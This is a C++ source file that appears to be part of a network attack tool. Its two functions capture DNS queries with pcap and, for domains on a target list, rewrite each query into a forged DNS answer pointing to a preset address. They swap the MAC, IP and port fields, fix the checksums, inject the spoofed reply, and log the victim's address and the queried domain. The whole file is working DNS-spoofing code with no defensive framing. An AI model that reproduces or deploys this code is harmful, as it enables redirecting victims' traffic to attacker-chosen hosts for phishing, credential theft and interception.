

#include <winsock2.h>
#include "Packet.h"
#include "attacker.h"
#include "attack.h"
#include "PacketProc.h"
#include "DnsUtils/dnsUtils.h"
#include "utils/checksum.h"
#include "informer.h"
#include "SSL/sslPublic.h"
#include "Utils/Tools.h"

int udpPacket(pcap_t* mPcapt,LPMACHEADER pMac ,LPPPPOEHEADER pppoe,IPHEADER * pIPV4Hdr, 
	DNSANSWER* mDnsAnswer,int mMode,DWORD mLocalIP,const char * pData,int realPackSize, Informer* mInformer) {


	int iIpv4HdrLen = pIPV4Hdr->HeaderSize << 2;

	int iIpPackLen = ntohs(pIPV4Hdr->PacketSize);

	LPUDPHEADER pUdpHdr = (LPUDPHEADER)((char*)pIPV4Hdr + iIpv4HdrLen);
	unsigned short usDport = ntohs(pUdpHdr->DstPort);
	if (usDport != DNS_PORT) {
		return realPackSize;
	}

	unsigned short usUdpSize = ntohs(pUdpHdr->PacketSize);
	int iDnsPackLen = usUdpSize - sizeof(UDPHEADER);
	if (iDnsPackLen >= DNS_PACKET_LIMIT || iDnsPackLen <= MIN_DNS_PACKET_SIZE)
	{
		return realPackSize;
	}

	LPDNSHEADER pDnsHdr = (LPDNSHEADER)((char*)pUdpHdr + sizeof(UDPHEADER));
	if (mMode == 3 || mMode == 1)
	{
		if (pDnsHdr->TransactionID == LOCAL_QUERY_DNS_ID)
		{
			if (pIPV4Hdr->SrcIP == mLocalIP &&
				(pIPV4Hdr->DstIP == gDnsServer ||pIPV4Hdr->DstIP == BACK_DNS_SERVER_ADDRESS || pIPV4Hdr->DstIP == DNS_SERVER_ADDRESS))
			{
				return realPackSize;
			}
		}
	}

	char* dnsname = (char*)((char*)pDnsHdr + sizeof(DNSHEADER));
	int iRet = DnsUitls::isTargetDNS(dnsname);
	if (iRet == 0) {
		return realPackSize;
	}

	if (pppoe != 0)
	{
		pppoe->len = ntohs(ntohs(pppoe->len) + sizeof(DNSANSWER));
	}

	pDnsHdr->Flags = 0x8081;
	pDnsHdr->Questions = 0x0100;
	pDnsHdr->AnswerRRS = 0x0100;
	pDnsHdr->AuthorityRRS = 0x0000;
	pDnsHdr->AdditionalRRS = 0x0000;
	memcpy((unsigned char*)pDnsHdr + iDnsPackLen, (unsigned char*)mDnsAnswer, sizeof(DNSANSWER));

	unsigned short  TmpPort = pUdpHdr->SrcPort;
	pUdpHdr->SrcPort = pUdpHdr->DstPort;
	pUdpHdr->DstPort = TmpPort;
	pUdpHdr->PacketSize = htons(usUdpSize + sizeof(DNSANSWER));
	pUdpHdr->PacketChksum = 0;
	pUdpHdr->PacketChksum =
		Checksum::subPackChecksum((char*)pUdpHdr, usUdpSize + sizeof(DNSANSWER), pIPV4Hdr->SrcIP, pIPV4Hdr->DstIP, IPPROTO_UDP);

	//pIPHdr->DF = 0;
	//pIPHdr->Unnamed = 0;
	//pIPHdr->FragmentOffset = 0;
	//pIPHdr->MF = 0;
	pIPV4Hdr->flag = 0;
	pIPV4Hdr->PacketSize = htons(iIpPackLen + sizeof(DNSANSWER));
	pIPV4Hdr->PacketID = ntohs(ntohs(pIPV4Hdr->PacketID) + 1);
	pIPV4Hdr->TimeToLive = 0x7f;

	unsigned int TmpIP = pIPV4Hdr->SrcIP;
	pIPV4Hdr->SrcIP = pIPV4Hdr->DstIP;
	pIPV4Hdr->DstIP = TmpIP;
	pIPV4Hdr->HeaderChksum = 0;
	pIPV4Hdr->HeaderChksum = Checksum::checksum((unsigned short*)pIPV4Hdr, iIpv4HdrLen);

	if (pMac) {
		char pTmpMac[MAC_ADDRESS_SIZE];
		memcpy(pTmpMac, pMac->DstMAC, MAC_ADDRESS_SIZE);
		memcpy(pMac->DstMAC, pMac->SrcMAC, MAC_ADDRESS_SIZE);
		memcpy(pMac->SrcMAC, pTmpMac, MAC_ADDRESS_SIZE);
	}

	iRet = pcap_sendpacket(mPcapt, (const unsigned char*)pData, realPackSize + sizeof(DNSANSWER));
	if (iRet == 0)
	{
		mInformer->notify(TmpIP, dnsname);

		//Public::recorduser(pIPHdr->DstIP, dnsname);								
		//printf("process dns:%s,length:%u ok\r\n", dnsname, realPackSize + sizeof(DNSANSWER));
	}
	else {
		log("%s %d dns:%s,length:%u error\r\n",__FUNCTION__,__LINE__, dnsname, realPackSize + sizeof(DNSANSWER));
	}

	return realPackSize;

}


int udpPacketIPV6(pcap_t* mPcapt, LPMACHEADER pMac, LPPPPOEHEADER pppoe, IPV6HEADER* pIPV6,
	DNSANSWERIPV6* mDnsAnswerIPV6, DNSANSWER* mDnsAnswer, int mMode, DWORD mLocalIP,const char* pData, int realPackSize, 
	Informer* mInformer) {

	int iIpPackLen = ntohs(pIPV6->PayloadLen);
	realPackSize = iIpPackLen + ((char*)pIPV6 - pData) + sizeof(IPV6HEADER);

	LPUDPHEADER pUDPHdr = (LPUDPHEADER)((char*)pIPV6 + sizeof(IPV6HEADER));
	unsigned short usDport = ntohs(pUDPHdr->DstPort);
	if (usDport != DNS_PORT) {
		return realPackSize;
	}
	unsigned short usUdpSize = ntohs(pUDPHdr->PacketSize);
	unsigned int iDnsPackLen = usUdpSize - sizeof(UDPHEADER);
	if (iDnsPackLen <= MIN_DNS_PACKET_SIZE || iDnsPackLen >= DNS_PACKET_LIMIT)
	{
		return realPackSize;
	}

	LPDNSHEADER pDnsHdr = (LPDNSHEADER)((char*)pUDPHdr + sizeof(UDPHEADER));
	if (mMode == 3 || mMode == 1)
	{
		if (pDnsHdr->TransactionID == LOCAL_QUERY_DNS_ID)
		{
			return realPackSize;
		}
	}

	char* dnsname = (char*)((char*)pDnsHdr + sizeof(DNSHEADER));
	int iRet = DnsUitls::isTargetDNS(dnsname);
	if (iRet == 0) {
		return realPackSize;
	}

	LPDNSTYPECLASS typecls = (LPDNSTYPECLASS)((char*)pUDPHdr + usUdpSize - sizeof(DNSTYPECLASS));
	int iSize = 0;
	if (typecls->dnstype == 0x1c00)
	{
		iSize = sizeof(DNSANSWERIPV6);
	}
	else if (typecls->dnstype == 0x0100)
	{
		iSize = sizeof(DNSANSWER);
	}
	else {
		return realPackSize;
	}

	if (pppoe != 0)
	{
		pppoe->len = ntohs(ntohs(pppoe->len) + iSize);
	}
	//00 1c 00 01代表dns请求ipv6地址
	pDnsHdr->Flags = 0x8081;
	pDnsHdr->Questions = 0x0100;
	pDnsHdr->AnswerRRS = 0x0100;
	pDnsHdr->AuthorityRRS = 0x0000;
	pDnsHdr->AdditionalRRS = 0x0000;

	if (typecls->dnstype == 0x1c00)
	{
		memcpy((unsigned char*)pDnsHdr + iDnsPackLen, (unsigned char*)mDnsAnswerIPV6, iSize);
	}
	else if (typecls->dnstype == 0x0100)
	{
		memcpy((unsigned char*)pDnsHdr + iDnsPackLen, (unsigned char*)mDnsAnswer, iSize);
	}

	unsigned short  TmpPort = pUDPHdr->SrcPort;
	pUDPHdr->SrcPort = pUDPHdr->DstPort;
	pUDPHdr->DstPort = TmpPort;
	pUDPHdr->PacketSize = htons(usUdpSize + iSize);
	pUDPHdr->PacketChksum = 0;
	pUDPHdr->PacketChksum = Checksum::IPV6subPackCheckSum((char*)pUDPHdr, usUdpSize + iSize, pIPV6->SourceAddress, pIPV6->DestAddress,
		IPPROTO_UDP);

	char tmpIP[IPV6_IP_SIZE];
	memcpy(tmpIP, pIPV6->SourceAddress, IPV6_IP_SIZE);
	memcpy(pIPV6->SourceAddress, pIPV6->DestAddress, IPV6_IP_SIZE);
	memcpy(pIPV6->DestAddress, tmpIP, IPV6_IP_SIZE);
	pIPV6->FlowLabelHigh4 = 0;
	pIPV6->FlowLabelLow16 = 0;
	pIPV6->TraficClassLow4 = 0;
	pIPV6->TCHigh4bits = 0;
	pIPV6->PayloadLen = ntohs(iIpPackLen + iSize);

	if (pMac) {
		char pTmpMac[MAC_ADDRESS_SIZE];
		memcpy(pTmpMac, pMac->DstMAC, MAC_ADDRESS_SIZE);
		memcpy(pMac->DstMAC, pMac->SrcMAC, MAC_ADDRESS_SIZE);
		memcpy(pMac->SrcMAC, pTmpMac, MAC_ADDRESS_SIZE);
	}

	iRet = pcap_sendpacket(mPcapt, (const unsigned char*)pData, realPackSize + iSize);
	if (iRet == 0)
	{
		unsigned long myip = 0x12345678;
		mInformer->notify(myip, dnsname);

		//printf("pcap_sendpacket ipv6 dns:%s,length:%u ok\r\n", dnsname, realPackSize + iSize);
		//Public::recordipv6user(pIPHdr->DestAddress, iDnsQueryName);
	}
	else
	{
		printf("pcap_sendpacket ipv6 dns:%s,length:%u error\r\n", dnsname, realPackSize + iSize);
	}

	return realPackSize;
}